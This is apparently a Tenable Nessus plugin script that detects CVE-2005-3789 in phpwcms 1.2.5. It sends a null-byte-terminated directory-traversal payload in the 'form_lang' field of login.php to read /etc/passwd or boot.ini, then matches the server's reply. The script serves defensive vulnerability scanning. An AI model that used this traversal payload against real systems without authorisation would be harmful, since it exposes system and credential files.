#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20216);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2015/02/11 21:07:50 $");

  script_cve_id("CVE-2005-3789");
  script_bugtraq_id(15436);
  script_osvdb_id(20862, 20863);

  script_name(english:"phpwcms 1.2.5 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpwcms");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpwcms, an open source content management
system written in PHP.

The version of phpwcms installed on the remote host does not sanitize
input to the 'form_lang' parameter of the 'login.php' script before
using it in PHP 'include()' functions.  An unauthenticated attacker
can exploit this issue to read local files and potentially to execute
arbitrary PHP code from local files.  A similar issue affects the
'imgdir' parameter of the 'img/random_image.php' script, although that
can only be used to read local files.

In addition, the application fails to sanitize user-supplied input
before using it in dynamically-generated pages, which can be used to
conduct cross-site scripting and HTTP response splitting attacks.
Some of these issues require that PHP's 'register_globals' setting be
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/416675");
 script_set_attribute(attribute:"solution", value:"Unknown at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/14");
 script_set_attribute(attribute:"patch_publication_date", value:"2005/11/21");
 script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/16");

script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:phpwcms:phpwcms");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("phpwcms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpwcms", "www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded: 0, php: TRUE);

install = get_install_from_kb(
  appname      : 'phpwcms',
  port         : port,
  exit_on_fail : TRUE
);

dir = install['dir'];

# Make sure login.php exists.
r = http_send_recv3(method: "GET", item: dir + "/login.php", port:port, exit_on_fail: TRUE);
if (isnull(r)) exit(0);
res = r[2];

# If it does and looks like it's from phpwcms...
if (
  "phpwcms" >< res &&
  '<input name="form_loginname"' >< res
)
{
  # Try to read a file.
  foreach file (make_list("/etc/passwd", "boot.ini"))
  {
    # nb: the app conveniently strips any slashes added by magic_quotes_gpc!
    postdata = "form_lang=../../../../../../../../../../../../" + file + "%00";
    r = http_send_recv3(
          method       : "POST",
          item         : dir+"/login.php",
          port         : port,
          content_type : "application/x-www-form-urlencoded",
          data         : postdata,
          exit_on_fail : TRUE
      );
    res = r[2];

    # There's a problem if it looks like one of the files...
    if (
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      "[boot loader]">< res
    )
    {
      if (report_verbosity > 0)
      {
        contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");
        if (!contents) contents = res;

        report = '\n' + contents;
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

	    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
    else exit(0,  "Could not obtain local file from phpwcms on port "+port+".");
  }
}
else exit(0, "The phpwcms install at '"+dir+"' on port "+port+" is not affected.");
